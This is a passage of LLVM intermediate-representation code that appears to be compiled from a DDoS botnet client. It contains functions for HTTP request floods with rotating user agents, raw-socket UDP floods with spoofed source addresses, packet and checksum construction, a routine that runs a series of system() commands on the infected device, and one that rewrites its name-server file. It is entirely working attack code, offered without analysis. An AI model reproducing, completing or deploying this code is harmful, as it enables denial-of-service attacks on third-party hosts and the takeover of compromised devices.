  br i1 %272, label %273, label %274

; <label>:273:                                    ; preds = %260
  call void @reset_telstate(%struct.telstate_t* nonnull %51)
  br label %281

; <label>:274:                                    ; preds = %260
  %275 = load i32, i32* %52, align 16
  %276 = add i32 %275, 25
  %277 = zext i32 %276 to i64
  %278 = call i64 @time(i64* null) #6
  %279 = icmp slt i64 %277, %278
  br i1 %279, label %280, label %281

; <label>:280:                                    ; preds = %274
  call void @reset_telstate(%struct.telstate_t* nonnull %51)
  br label %281

; <label>:281:                                    ; preds = %58, %174, %214, %102, %101, %136, %130, %156, %150, %194, %188, %259, %253, %280, %274, %228, %237, %238, %252, %186, %187, %148, %149, %123, %124, %84, %273, %213, %208, %173, %168, %129, %83, %80
  %282 = add nsw i32 %.194, 1
  %283 = icmp slt i32 %282, %1
  %brmerge = or i1 %283, %41
  %.mux = select i1 %283, i32 %282, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %281
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #6

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #3 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #4 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %xtraiter = and i32 %addconv, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph16.prol.loopexit, label %.lr.ph16.prol.preheader

.lr.ph16.prol.preheader:                          ; preds = %.lr.ph16.preheader
  br label %.lr.ph16.prol

.lr.ph16.prol:                                    ; preds = %.lr.ph16.prol, %.lr.ph16.prol.preheader
  %.014.prol = phi i64 [ %11, %.lr.ph16.prol ], [ 0, %.lr.ph16.prol.preheader ]
  %.0913.prol = phi i32 [ %12, %.lr.ph16.prol ], [ %1, %.lr.ph16.prol.preheader ]
  %.01012.prol = phi i16* [ %8, %.lr.ph16.prol ], [ %0, %.lr.ph16.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph16.prol ], [ %xtraiter, %.lr.ph16.prol.preheader ]
  %8 = getelementptr inbounds i16, i16* %.01012.prol, i64 1
  %9 = load i16, i16* %.01012.prol, align 2
  %10 = zext i16 %9 to i64
  %11 = add i64 %10, %.014.prol
  %12 = add nsw i32 %.0913.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph16.prol.loopexit.unr-lcssa, label %.lr.ph16.prol, !llvm.loop !8

.lr.ph16.prol.loopexit.unr-lcssa:                 ; preds = %.lr.ph16.prol
  br label %.lr.ph16.prol.loopexit

.lr.ph16.prol.loopexit:                           ; preds = %.lr.ph16.preheader, %.lr.ph16.prol.loopexit.unr-lcssa
  %.014.unr = phi i64 [ 0, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.0913.unr = phi i32 [ %1, %.lr.ph16.preheader ], [ %12, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.01012.unr = phi i16* [ %0, %.lr.ph16.preheader ], [ %8, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.lcssa26.unr = phi i64 [ undef, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %13 = icmp ult i32 %4, 6
  br i1 %13, label %._crit_edge17.loopexit, label %.lr.ph16.preheader.new

.lr.ph16.preheader.new:                           ; preds = %.lr.ph16.prol.loopexit
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16, %.lr.ph16.preheader.new
  %.014 = phi i64 [ %.014.unr, %.lr.ph16.preheader.new ], [ %29, %.lr.ph16 ]
  %.0913 = phi i32 [ %.0913.unr, %.lr.ph16.preheader.new ], [ %30, %.lr.ph16 ]
  %.01012 = phi i16* [ %.01012.unr, %.lr.ph16.preheader.new ], [ %26, %.lr.ph16 ]
  %14 = getelementptr inbounds i16, i16* %.01012, i64 1
  %15 = load i16, i16* %.01012, align 2
  %16 = zext i16 %15 to i64
  %17 = add i64 %16, %.014
  %18 = getelementptr inbounds i16, i16* %.01012, i64 2
  %19 = load i16, i16* %14, align 2
  %20 = zext i16 %19 to i64
  %21 = add i64 %20, %17
  %22 = getelementptr inbounds i16, i16* %.01012, i64 3
  %23 = load i16, i16* %18, align 2
  %24 = zext i16 %23 to i64
  %25 = add i64 %24, %21
  %26 = getelementptr inbounds i16, i16* %.01012, i64 4
  %27 = load i16, i16* %22, align 2
  %28 = zext i16 %27 to i64
  %29 = add i64 %28, %25
  %30 = add nsw i32 %.0913, -8
  %31 = icmp sgt i32 %30, 1
  br i1 %31, label %.lr.ph16, label %._crit_edge17.loopexit.unr-lcssa

._crit_edge17.loopexit.unr-lcssa:                 ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %.lr.ph16.prol.loopexit, %._crit_edge17.loopexit.unr-lcssa
  %.lcssa26 = phi i64 [ %.lcssa26.unr, %.lr.ph16.prol.loopexit ], [ %29, %._crit_edge17.loopexit.unr-lcssa ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %32 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %32, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa26, %._crit_edge17.loopexit ]
  %33 = icmp eq i32 %.09.lcssa, 1
  br i1 %33, label %34, label %.preheader

; <label>:34:                                     ; preds = %._crit_edge17
  %35 = bitcast i16* %.010.lcssa to i8*
  %36 = load i8, i8* %35, align 1
  %37 = zext i8 %36 to i64
  %38 = add i64 %37, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %34, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %38, %34 ]
  %39 = lshr i64 %.1.ph, 16
  %40 = icmp eq i64 %39, 0
  br i1 %40, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %41 = phi i64 [ %44, %.lr.ph ], [ %39, %.lr.ph.preheader ]
  %.111 = phi i64 [ %43, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %42 = and i64 %.111, 65535
  %43 = add nuw nsw i64 %42, %41
  %44 = lshr i64 %43, 16
  %45 = icmp eq i64 %44, 0
  br i1 %45, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %43, %._crit_edge.loopexit ]
  %46 = trunc i64 %.1.lcssa to i16
  %47 = xor i16 %46, -1
  ret i16 %47
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #1 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = load i32, i32* %3, align 4
  %5 = zext i32 %4 to i64
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %7 = load i32, i32* %6, align 4
  %8 = zext i32 %7 to i64
  %9 = tail call zeroext i16 @htons(i16 zeroext 20) #15
  %10 = tail call noalias i8* @malloc(i64 44) #6
  %11 = bitcast i8* %10 to i16*
  %.sroa.0.0..sroa_cast = bitcast i8* %10 to i64*
  store i64 %5, i64* %.sroa.0.0..sroa_cast, align 1
  %.sroa.2.0..sroa_idx6 = getelementptr inbounds i8, i8* %10, i64 8
  %.sroa.2.0..sroa_cast = bitcast i8* %.sroa.2.0..sroa_idx6 to i64*
  store i64 %8, i64* %.sroa.2.0..sroa_cast, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %10, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %10, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %.sroa.5.0..sroa_idx7 = getelementptr inbounds i8, i8* %10, i64 18
  %12 = bitcast i8* %.sroa.5.0..sroa_idx7 to i16*
  store i16 %9, i16* %12, align 1
  %13 = getelementptr inbounds i8, i8* %10, i64 24
  %14 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %13, i8* %14, i64 20, i32 1, i1 false)
  %15 = tail call zeroext i16 @csum(i16* %11, i32 44)
  tail call void @free(i8* %10) #6
  ret i16 %15
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #7

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) local_unnamed_addr #1 {
  %7 = alloca [512 x i8], align 16
  %8 = alloca [1 x i8], align 1
  %9 = tail call i64 @time(i64* null) #6
  %10 = zext i32 %4 to i64
  %11 = add i64 %9, %10
  %12 = icmp sgt i32 %5, 0
  br i1 %12, label %.lr.ph15, label %._crit_edge16

.lr.ph15:                                         ; preds = %6
  %13 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  br label %16

; <label>:14:                                     ; preds = %16
  %15 = icmp slt i32 %25, %5
  br i1 %15, label %16, label %._crit_edge16.loopexit

; <label>:16:                                     ; preds = %.lr.ph15, %14
  %.013 = phi i32 [ 0, %.lr.ph15 ], [ %25, %14 ]
  %17 = tail call i32 @rand() #6
  %18 = srem i32 %17, 36
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %19
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %13, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.97, i64 0, i64 0), i8* %0, i8* %3, i8* %1, i8* %21) #6
  %23 = tail call i32 @fork() #6
  %24 = icmp eq i32 %23, 0
  %25 = add nuw nsw i32 %.013, 1
  br i1 %24, label %14, label %.preheader

.preheader:                                       ; preds = %16
  %sext = shl i64 %11, 32
  %26 = ashr exact i64 %sext, 32
  %27 = tail call i64 @time(i64* null) #6
  %28 = icmp sgt i64 %26, %27
  br i1 %28, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %.preheader
  %29 = getelementptr inbounds [1 x i8], [1 x i8]* %8, i64 0, i64 0
  br label %30

; <label>:30:                                     ; preds = %.lr.ph, %.backedge
  %31 = tail call i32 @socket_connect(i8* %1, i16 zeroext %2)
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %.backedge, label %33

; <label>:33:                                     ; preds = %30
  %34 = call i64 @strlen(i8* nonnull %13) #14
  %35 = call i64 @write(i32 %31, i8* nonnull %13, i64 %34) #6
  %36 = call i64 @read(i32 %31, i8* nonnull %29, i64 1) #6
  %37 = tail call i32 @close(i32 %31) #6
  br label %.backedge

.backedge:                                        ; preds = %33, %30
  %38 = tail call i64 @time(i64* null) #6
  %39 = icmp sgt i64 %26, %38
  br i1 %39, label %30, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  tail call void @exit(i32 0) #16
  unreachable

._crit_edge16.loopexit:                           ; preds = %14
  br label %._crit_edge16

._crit_edge16:                                    ; preds = %._crit_edge16.loopexit, %6
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #12

; Function Attrs: noinline nounwind uwtable
define void @SendHTTPHex(i8*, i8*, i16 zeroext, i8* nocapture readnone, i32, i32) local_unnamed_addr #1 {
  %7 = alloca [512 x i8], align 16
  %8 = alloca [1 x i8], align 1
  %9 = alloca [2048 x i8], align 16
  %10 = tail call i64 @time(i64* null) #6
  %11 = zext i32 %4 to i64
  %12 = add i64 %10, %11
  %13 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %13, i8* getelementptr inbounds ([265 x i8], [265 x i8]* @.str.98, i64 0, i64 0), i64 265, i32 1, i1 false)
  %14 = icmp sgt i32 %5, 0
  br i1 %14, label %.lr.ph14, label %._crit_edge15

.lr.ph14:                                         ; preds = %6
  %15 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  br label %18

; <label>:16:                                     ; preds = %18
  %17 = icmp slt i32 %27, %5
  br i1 %17, label %18, label %._crit_edge15.loopexit

; <label>:18:                                     ; preds = %.lr.ph14, %16
  %.012 = phi i32 [ 0, %.lr.ph14 ], [ %27, %16 ]
  %19 = call i32 @rand() #6
  %20 = srem i32 %19, 36
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %21
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %15, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.97, i64 0, i64 0), i8* %0, i8* nonnull %13, i8* %1, i8* %23) #6
  %25 = call i32 @fork() #6
  %26 = icmp eq i32 %25, 0
  %27 = add nuw nsw i32 %.012, 1
  br i1 %26, label %16, label %.preheader

.preheader:                                       ; preds = %18
  %sext = shl i64 %12, 32
  %28 = ashr exact i64 %sext, 32
  %29 = call i64 @time(i64* null) #6
  %30 = icmp sgt i64 %28, %29
  br i1 %30, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %.preheader
  %31 = getelementptr inbounds [1 x i8], [1 x i8]* %8, i64 0, i64 0
  br label %32

; <label>:32:                                     ; preds = %.lr.ph, %.backedge
  %33 = call i32 @socket_connect(i8* %1, i16 zeroext %2)
  %34 = icmp eq i32 %33, 0
  br i1 %34, label %.backedge, label %35

; <label>:35:                                     ; preds = %32
  %36 = call i64 @strlen(i8* nonnull %15) #14
  %37 = call i64 @write(i32 %33, i8* nonnull %15, i64 %36) #6
  %38 = call i64 @read(i32 %33, i8* nonnull %31, i64 1) #6
  %39 = call i32 @close(i32 %33) #6
  br label %.backedge

.backedge:                                        ; preds = %35, %32
  %40 = call i64 @time(i64* null) #6
  %41 = icmp sgt i64 %28, %40
  br i1 %41, label %32, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  call void @exit(i32 0) #16
  unreachable

._crit_edge15.loopexit:                           ; preds = %16
  br label %._crit_edge15

._crit_edge15:                                    ; preds = %._crit_edge15.loopexit, %6
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #3 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) local_unnamed_addr #1 {
  %2 = icmp slt i32 %0, 3
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %1
  %4 = tail call i32 @close(i32 %0) #6
  br label %5

; <label>:5:                                      ; preds = %1, %3
  %.0 = phi i32 [ 0, %3 ], [ 1, %1 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() local_unnamed_addr #1 {
  %1 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.99, i64 0, i64 0), i32 513) #6
  %2 = tail call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.99, i64 0, i64 0), i32 0) #6
  %3 = icmp eq i32 %2, -1
  br i1 %3, label %8, label %4

; <label>:4:                                      ; preds = %0
  %5 = and i32 %1, 65535
  %6 = tail call i64 @write(i32 %5, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.100, i64 0, i64 0), i64 38) #6
  %7 = tail call i32 @close(i32 %5) #6
  br label %8

; <label>:8:                                      ; preds = %0, %4
  ret void
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @CleanDevice() local_unnamed_addr #1 {
  %1 = tail call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.101, i64 0, i64 0)) #6
  %2 = tail call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.102, i64 0, i64 0)) #6
  %3 = tail call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.103, i64 0, i64 0)) #6
  %4 = tail call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.104, i64 0, i64 0)) #6
  %5 = tail call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.105, i64 0, i64 0)) #6
  %6 = tail call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.106, i64 0, i64 0)) #6
  %7 = tail call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.107, i64 0, i64 0)) #6
  %8 = tail call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.108, i64 0, i64 0)) #6
  %9 = tail call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.109, i64 0, i64 0)) #6
  %10 = tail call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.110, i64 0, i64 0)) #6
  %11 = tail call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.111, i64 0, i64 0)) #6
  %12 = tail call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.112, i64 0, i64 0)) #6
  %13 = tail call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.113, i64 0, i64 0)) #6
  ret void
}

declare i32 @system(i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i32, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = icmp eq i32 %1, 0
  br i1 %12, label %13, label %16

; <label>:13:                                     ; preds = %8
  %14 = tail call i32 @rand_cmwc()
  %15 = trunc i32 %14 to i16
  br label %19

; <label>:16:                                     ; preds = %8
  %17 = trunc i32 %1 to i16
  %18 = tail call zeroext i16 @htons(i16 zeroext %17) #15
  br label %19

; <label>:19:                                     ; preds = %16, %13
  %.sink = phi i16 [ %18, %16 ], [ %15, %13 ]
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 1
  store i16 %.sink, i16* %20, align 2
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 2
  %22 = call i32 @getHost(i8* %0, %struct.in_addr* %21)
  %23 = icmp eq i32 %22, 0
  br i1 %23, label %24, label %.loopexit

; <label>:24:                                     ; preds = %19
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 3, i64 0
  %26 = bitcast i8* %25 to i64*
  store i64 0, i64* %26, align 4
  %27 = icmp eq i32 %3, 32
  br i1 %27, label %28, label %64

; <label>:28:                                     ; preds = %24
  %29 = tail call i32 @socket(i32 2, i32 2, i32 17) #6
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %34

; <label>:31:                                     ; preds = %28
  %32 = load i32, i32* @switchCommStock, align 4
  %33 = tail call i32 (i32, i8*, ...) @botnetPrint(i32 %32, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.114, i64 0, i64 0))
  br label %.loopexit

; <label>:34:                                     ; preds = %28
  %35 = add nsw i32 %4, 1
  %36 = sext i32 %35 to i64
  %37 = tail call noalias i8* @malloc(i64 %36) #6
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit, label %39

; <label>:39:                                     ; preds = %34
  tail call void @llvm.memset.p0i8.i64(i8* nonnull %37, i8 0, i64 %36, i32 1, i1 false)
  tail call void @makeRandomStr(i8* nonnull %37, i32 %4)
  %40 = tail call i64 @time(i64* null) #6
  %41 = zext i32 %2 to i64
  %42 = add i64 %40, %41
  %43 = sext i32 %4 to i64
  %44 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %sext71 = shl i64 %42, 32
  %45 = ashr exact i64 %sext71, 32
  %46 = mul nsw i32 %7, 1000
  br label %.outer

.outer:                                           ; preds = %.outer.backedge, %39
  %.068.ph = phi i32 [ 0, %39 ], [ %.068.ph.be, %.outer.backedge ]
  %.067.ph = phi i32 [ 0, %39 ], [ %58, %.outer.backedge ]
  br label %47

; <label>:47:                                     ; preds = %.outer, %54
  %.067 = phi i32 [ 0, %54 ], [ %.067.ph, %.outer ]
  %48 = call i64 @sendto(i32 %29, i8* nonnull %37, i64 %43, i32 0, %struct.sockaddr* nonnull %44, i32 16) #6
  %49 = icmp eq i32 %.067, %5
  br i1 %49, label %50, label %57

; <label>:50:                                     ; preds = %47
  br i1 %12, label %51, label %54

; <label>:51:                                     ; preds = %50
  %52 = call i32 @rand_cmwc()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %20, align 2
  br label %54

; <label>:54:                                     ; preds = %51, %50
  %55 = call i64 @time(i64* null) #6
  %56 = icmp sgt i64 %55, %45
  br i1 %56, label %.loopexit.loopexit, label %47

; <label>:57:                                     ; preds = %47
  %58 = add i32 %.067, 1
  %59 = icmp eq i32 %.068.ph, %6
  br i1 %59, label %60, label %62

; <label>:60:                                     ; preds = %57
  %61 = call i32 @usleep(i32 %46) #6
  br label %.outer.backedge

.outer.backedge:                                  ; preds = %60, %62
  %.068.ph.be = phi i32 [ %63, %62 ], [ 0, %60 ]
  br label %.outer

; <label>:62:                                     ; preds = %57
  %63 = add i32 %.068.ph, 1
  br label %.outer.backedge

; <label>:64:                                     ; preds = %24
  %65 = tail call i32 @socket(i32 2, i32 3, i32 17) #6
  %66 = icmp eq i32 %65, 0
  br i1 %66, label %67, label %70

; <label>:67:                                     ; preds = %64
  %68 = load i32, i32* @switchCommStock, align 4
  %69 = tail call i32 (i32, i8*, ...) @botnetPrint(i32 %68, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.114, i64 0, i64 0))
  br label %.loopexit

; <label>:70:                                     ; preds = %64
  store i32 1, i32* %10, align 4
  %71 = bitcast i32* %10 to i8*
  %72 = call i32 @setsockopt(i32 %65, i32 0, i32 3, i8* nonnull %71, i32 4) #6
  %73 = icmp slt i32 %72, 0
  br i1 %73, label %74, label %.preheader.preheader

.preheader.preheader:                             ; preds = %70
  br label %.preheader

; <label>:74:                                     ; preds = %70
  %75 = load i32, i32* @switchCommStock, align 4
  %76 = call i32 (i32, i8*, ...) @botnetPrint(i32 %75, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.115, i64 0, i64 0))
  br label %.loopexit

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.06975 = phi i32 [ %77, %.preheader ], [ 50, %.preheader.preheader ]
  %77 = add nsw i32 %.06975, -1
  %78 = call i64 @time(i64* null) #6
  %79 = call i32 @rand_cmwc()
  %80 = zext i32 %79 to i64
  %81 = xor i64 %80, %78
  %82 = trunc i64 %81 to i32
  call void @srand(i32 %82) #6
  %83 = call i32 @rand() #6
  call void @init_rand(i32 %83)
  %84 = icmp eq i32 %77, 0
  br i1 %84, label %85, label %.preheader

; <label>:85:                                     ; preds = %.preheader
  %86 = icmp eq i32 %3, 0
  %87 = sub nsw i32 32, %3
  %88 = shl i32 -1, %87
  %.070 = select i1 %86, i32 0, i32 %88
  %89 = sext i32 %4 to i64
  %90 = add nsw i64 %89, 28
  %91 = call i8* @llvm.stacksave()
  %92 = alloca i8, i64 %90, align 16
  %93 = bitcast i8* %92 to %struct.iphdr*
  %94 = getelementptr i8, i8* %92, i64 20
  %95 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i64 0, i32 0
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @GRIP(i32 %.070)
  %98 = call i32 @htonl(i32 %97) #15
  %99 = add nsw i64 %89, 8
  %100 = trunc i64 %99 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %93, i32 %96, i32 %98, i8 zeroext 17, i32 %100)
  %101 = trunc i64 %99 to i16
  %102 = call zeroext i16 @htons(i16 zeroext %101) #15
  %103 = getelementptr inbounds i8, i8* %92, i64 24
  %104 = bitcast i8* %103 to i16*
  store i16 %102, i16* %104, align 8
  %105 = call i32 @rand_cmwc()
  %106 = trunc i32 %105 to i16
  %107 = bitcast i8* %94 to i16*
  store i16 %106, i16* %107, align 4
  br i1 %12, label %108, label %110

; <label>:108:                                    ; preds = %85
  %109 = call i32 @rand_cmwc()
  br label %114

; <label>:110:                                    ; preds = %85
  %111 = trunc i32 %1 to i16
  %112 = call zeroext i16 @htons(i16 zeroext %111) #15
  %113 = zext i16 %112 to i32
  br label %114

; <label>:114:                                    ; preds = %110, %108
  %115 = phi i32 [ %109, %108 ], [ %113, %110 ]
  %116 = trunc i32 %115 to i16
  %117 = getelementptr inbounds i8, i8* %92, i64 22
  %118 = bitcast i8* %117 to i16*
  store i16 %116, i16* %118, align 2
  %119 = getelementptr inbounds i8, i8* %92, i64 26
  %120 = bitcast i8* %119 to i16*
  store i16 0, i16* %120, align 2
  %121 = getelementptr inbounds i8, i8* %92, i64 28
  call void @makeRandomStr(i8* %121, i32 %4)
  %122 = bitcast i8* %92 to i16*
  %123 = getelementptr inbounds i8, i8* %92, i64 2
  %124 = bitcast i8* %123 to i16*
  %125 = load i16, i16* %124, align 2
  %126 = zext i16 %125 to i32
  %127 = call zeroext i16 @csum(i16* nonnull %122, i32 %126)
  %128 = getelementptr inbounds i8, i8* %92, i64 10
  %129 = bitcast i8* %128 to i16*
  store i16 %127, i16* %129, align 2
  %130 = call i64 @time(i64* null) #6
  %131 = zext i32 %2 to i64
  %132 = add i64 %130, %131
  %133 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %134 = getelementptr inbounds i8, i8* %92, i64 4
  %135 = bitcast i8* %134 to i16*
  %136 = getelementptr inbounds i8, i8* %92, i64 12
  %137 = bitcast i8* %136 to i32*
  %sext = shl i64 %132, 32
  %138 = ashr exact i64 %sext, 32
